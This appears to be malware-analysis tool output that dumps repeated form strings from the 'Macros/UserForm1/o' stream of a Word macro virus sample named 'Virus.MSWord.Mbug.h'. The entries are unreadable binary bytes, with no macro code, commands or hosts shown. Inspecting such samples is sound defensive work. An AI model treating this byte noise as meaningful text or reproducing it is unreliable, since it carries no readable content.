B##X'1Y1)B1)BB9BB9B9)9F-=F-=BB9B9BJBBJBBJBBOGGOGGOGGOGGRJJOGGOGGOGGRBBJBJRBBOGGJJRZKUB9JB/V99J##X
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!LHk}r�]i�~��ӻ̰��µ谧�ƫ�ƫ�]i�99{���DL���֌��}��ew�~��fs�LY�)5k'1Y##X##X
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Z!1k)5k%-s)5s&-�)5s1E�1E�DL�FV�9L�19J
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
c!1k&-�1E�.D�.D�!1k
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
D&-����̹䞟�~��~�ϣ����ۛ��'1Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B1)B1)B9)9B9BB9BJBBJBBJBBJBBOGGOGGNPTOGGNPTRBBZKURBJRBBZKURBBRBBBB9B9B9)9F-=9991991)B3.D'&D#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=B/V99JBBRJBBJBBB9BF-=9993#)3#)))!3#)3.+3.+<.<9)9DD;���

#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B##X#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=1)B99JB9BJBBB9B999F-=BB9JBBJBBJBBJBBJBBOGGOGGRJJOGGRJJOGGZKUOGGZKUOGGZKUOGGJJRBBR19J'&D'&D
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9t_�ƫ͌�������Ǟ����ɰ��̹�ƫ�9I�xw����dt�ƫ�~��~��������~��LY�)Bo
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
N##X##X%)o%-s)5s)5s.?�&-�1E�9L�9L�DL�.?�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
"~N]����µ�~��~��~�ϔ�ޔ��~��BMk
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B1)B1)B9)9B9JB9BJBBB9BJBBJBBOGGOGGOGGOGGOGGZKUOGGOGGZKUOGGZKUJBBJBBB9BBB9F-=9999)93.D#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!B1)B1)BBBRBBRRBJJBBB9B9)99993.+3#)3#)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!3#)3#)=-1999D;D���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=1-X1)BB9BB9BB9B9)99)9F-=9)9JBBJBBJBBJBBJBBOGGOGGOGGRJJOGGOGGOGGNPTRBJOGGNPTJJRRBJBBRB/V1)B#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9XFmӻ�ӻ̮��dt�������ӻ���ޮ��99{�����ǌ��̹䛟Ǧ�������ǌ��]i�5:k!1k##X!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
N##X##X##X%)o%-s)5s%-s.D�9I�1E�1E�9L�K[�9I�%-s
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
`+)�&-�&-�FV����µ裟�~��iu�~�ψ�؞�֙��5:k
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=1)B1)B9)9B9BB9BB9BJBBJBBJBBRBBOGGRJJRBJZKUZKURBJRBBZKUJBBOGGJBBJBBJBBB9B9)9F-=9911)B1)B$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B1)B1)BBBRBBRJBBJBBJBBB9B9)93.+3#)3#)3#)3#)3#)1999)9H/?���

#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=1)B99JB9BB9BB9BB9BF-=BB99)9BB9JBBJBBJBBOGGOGGOGGZKUOGGRJJOGGOGGNPTZKUOGGOGGZKUJBJ>FX1)B1-X##X
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Na[~ӻ�������}��~�����̹���⌌�DL�ӻ̞��̹�ӻ̰�ʛ�Ǧ��������dt�BMk!1k##X
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)^##X##X##X##X
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
c19c!1k.3~.3~&-�.D�1E�&-�9L�9L�1E�1E�.?�!1k%-s%-s.3~!1k%)o
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
"~&-�TZ�iu�~����ص��µ����~��ew�iu�~�ϔ�ޔ�ޔ��9I�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=1)B1)B<.<B9BB9BB9BJBBJBBJBBJBBOGGOGGZKURBBZKUZKUZKUZKUR9BZKUJBBJBBJBBJBB9)99999991)B)%9$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=99JB/VJBJJBBJBBJBBB9B9)93.+3.+3#)3#))!)3#)991199;+;���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=1)B99J99JB9B9)9999F-=B9BB9BB9BJBBJBBJBBJBBOGGOGGOGGOGGOGGOGGOGGOGGOGGOGGOGGNPTJJRJ9R19J'1Y##X
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!'1Yƫ����ӻ�ӻ�}��Xe�]i�ƫ����}��Xe�޸錅����޸鰧ʰ��~�ϰ�ʛ�ǁ��K[�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)^##X##X##X##X##X##X
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
`99{)5s+)�9I�&-�9L�&-�1E�1E�9L�9L�K[�9I�.D�%-s.?�&-�9L�1E�1E�9L�ew����µ蔠ވ�ص��µ���ࣟ�`b�N]�iu�~�Ϟ�֣�ࣟ�GF�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
='&D1)B<.<<.<B9BJBBJBBJBBJBBOGGOGGRJJOGGOGGZKURBBZKURBBZKUOGGOGGJBBJBBJ99F-=999=-1)%9$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B1)B1)BBBRJJRZKURBBJBBB9BF-=9993.+3#)1!!3#)3#)9)9991>0>���

3
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=1)B99J9)9B9BB9BB9B9)9J9BB9B9)9JBBJBBJBBJBBOGGOGGOGGOGGOGGOGGZKUJBBOGGOGGZKUOGGJJRBBRB/V1)B#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!##X������������}��K[�1E������ތ��������iu�������ƫ͞�֌��������~��sx�5:k##X##X##X##X##X##X)5k%-s%-s.D�.D�1E�9L�9I�1E�9L�DL�9L�1E�9L�9I�.D�.D�.D�1E�1E�DL�DL�Xe�~�ϛ��ew�{{�̹�µ�µ�~��1E�N]�iu�~�ϔ�ޣ�����[[�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=1)B1)B3.DJBBB9BB9BJBBJBBOGGOGGOGGOGGOGGRJJOGGZKUR9BZKUOGGOGGJBBJBBJBBB9B9)99993#))%9)%9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=B/V99JBBRJJRRBBJBBB9B9)93#)<.<))!3#)3#)3#)3#)991;+;���

#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=1)B99JB9BB9BB9BB9BB9BB9BBB9JBBJBBJBBJBBOGGOGGOGGOGGOGGOGGZKUJBBOGGOGGOGGJJRZKUJ9RJBJ19J1)B##X
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9LHk���������dt�LY�.3~xw���ʁ��ƫ�޸�xw����̹���������������ʦ��}��)Bo
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
c##X##X
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
`##X%)o!1k.3~.3~.D�1E�.D�&-�9L�9L�1E�1E�FV�9L�9L�1E�1E�9I�%-s%)o
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)^'1Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)^`bǵ��޸鵯�Xe�1?�N]�iu͔�ޣ�ࣟ����]i�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B'&D1)B1)B9)9B9BB9BJBBJBBJBBOGGOGGOGGNPTZKURBBRJJZKURBJZKUOGGOGGOGGJBBJBBB9BF-=9999991)B)!)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B1)B1)BB/VBBROGGZKUJBBJBBB9BB9B=-13#))!)3#)3#)3.+3#);;;���

#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=1)B99JB9BB9BB9B9)9BB9F-=9)9BB9JBBJBBJBBJBBOGGOGGOGGZKUOGGOGGOGGOGGOGGNPTJJRZKURBJBBRB/V#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ja[~������fs�a[~.?�[[�dt�K[�xw�޸雟�ƫ������˦��~����������ǁ��5:k'1Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)^##X!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J'1Y%-s)5s%-s.D�1E�.D�1E�1E�GF�9L�1E�9L�FV�FV�FV�9L�.D�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1%)oDL�~��~��AK�1?�N]���أ�൯ⵯ⣟�]i�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=1)B1)BB9BB9BB9BJBBJBBJBBRBJOGGOGGRJJOGGZKUOGGZKUOGGRBJOGGZKUOGGJBBJBB9)9999999999)%9$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=B/VB/VRBJJJRRBBJBJJBBB9B999<.<=-1))!3#)3#)3#)9)9;+;���

#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
N1-X)%999JB9BB9BJBBJBBJ999)9B9BJBBJBBJBBJBBOGGOGGOGGZKURBBOGGRJJOGGOGGOGGZKURBJJJRJJRJBJ1)B'1Y!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1XFm������iiqPZmBMk%-s9I�%-s1E����xw�ew����ƫ͛�ǁ����Ǯ�����}��LY�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)^##X##X!1k%)o%-s)5s&-�.D�.3~1E�1E�1E�9L�1E�9L�9L�DL�DL�FV�FV�.?�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
`+)�1E�DL�AK�iuͣ�൯�µ赯⣟�[[�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=1)B1)B1)BB9BB9BB9BJBBJBBJBBJBBOGGOGGOGGOGGOGGOGGOGGOGGOGGOGGOGGOGGJBBJBBB9BF-=9999991)B$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B1)B3.DJ9RJJRJJRZKUOGGOGGJBBF-=9993#)3#)3#)')-3#)3.+;;;���

#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J1)B1)B99JB9BJBBJBBB9BB9BBB9J99JBBJBBJBBJBBOGGZKUZKURBBOGGOGGOGGOGGOGGOGGNPTJJRZKURBJBBRB/V1)B##X
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!GF����fs�9Fc)%9!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J)Bo.D�.D�.D�.D�+)�%)o
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
n9I�}��������������dt�Rcs##X##X##X##X!1k)5s+)�.D�.D�1E�1E�1E�9I�1E�1E�1E�DL�FV�N]�DL�Xe�.D�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
nDL�{{ң��̹�������µ赯�Xe�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
='&D1)B99JB9BB9BJBBJBBJBBOGGOGGJJROGGOGGOGGOGGOGGOGGOGGOGGOGGOGGJBBJBBJBBJBB9)99999991)B)!)$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=3.DB/VJJRZKURBJOGGOGGJBBJBB9)9999=-13#)3#)3#)3#)?/3���

#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B1)B1)B99JJBBB9BJBBJBB9)9B9BJBBJBBJBBJBBJBBOGGOGGOGGOGGOGGOGGOGGOGGOGGOGGOGGOGGJJRNPTB/VB/V!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J'&D#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!a[~ƫ�ai~1)B'&D1-X##X9I�%-s.3~!1k##X
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
c'1Y%)o]i�xw����ƫ͝��sx�K[�'1Y##X##X!1k%-s%-s.3~&-�.D�$3�.D�&-�9L�9L�9I�9L�FV�DL�FV�Xe�FV�9I�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)^##X
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
c1?�`b�̹����������µ赯�Xe�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=99J9)999JJBBJBBJBBJBBOGGOGGJBBOGGJBBOGGJBBOGGOGGOGGOGGOGGJBBJBBJBBJBBJ999)99999993#)1)B
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B)%999JB/VBBRJJRZKUJBBOGGOGGJ99999999=-1))!3#))!)3.+;+;���

#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9##X#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=1)B99JB9BB9BJBBB9BB9BJ99JBBJBBJBBJBBJBBOGGOGGOGGZKUOGGOGGOGGOGGJBBOGGOGGZKUOGGN?VBBR1)B19J!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J�����Ɂ��BMk1-X19c.3~!1k)5k)5k)5k'1Y!1k%)o99{fs����~��������dt�LY�19c
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)^%)o19c!1k!1k.D�.D�.D�1E�&-�1E�,4�1E�&-�9L�1E�FV�N]�Xe�9L�9L�'1Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
`+)�&-�1E�N]�µ����������µ�µ�xw�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J1)B1)BJ9R999JBJJBBJBBJBBOGGOGGOGGOGGOGGOGGOGGOGGJBBJBBOGGJBBJBBJBBJBBJBBB9BB9BF-=9)9199$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B1-X1)BBBRB/VOGGJJRZKURBBJBJJBBF-=9999993.+3#)3#)3#)5%+���

#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B1)B1)B99JB9BJBBB9BJBBB9BJBBB9BJBBJBBJBBJBBOGGOGGOGGOGGOGGZKUJBBOGGJBBOGGOGGNPTJJRJ9RB9J19J!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!1-Xƫ�ӻ̮��t_�BMk]i�.D�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
`41l%)o[[����}�������Ǯ��}��)Bo19c##X!1k%-s.3~&-�.3~&-�1E�&-�1E�,4�&-�,4�1E�9L�9L�FV�DL�N]�DL�FV�1E�##X
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)^!1k
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
`+)�.D�1?�AK�iu͵��޸�̹����̹����~��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=3.DB9BB9BJBJJBBJBBJBBOGGOGGOGGOGGOGGOGGJBBJBBJBBJBBJBBJBBJBBJBBJBBJBBJ999)9B9B1)B1991)B
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J99JB/VBBRJJRZKURBJOGGRBJJBBB9B9)9<.<=-13#)3#)3#)5%+���

#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B1)B1)BB9B9)9JBBRBBB9BJBBB9BJBBJBBJBBJBBJBBOGGOGGOGGOGGOGGJBBOGGOGGOGGOGGOGGOGGZKUBBRB/V19J1-X
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=���������������}��%)o!1k!1k
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
N%)o%)oxw�ӻ̝�����������dt�K[�19c
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
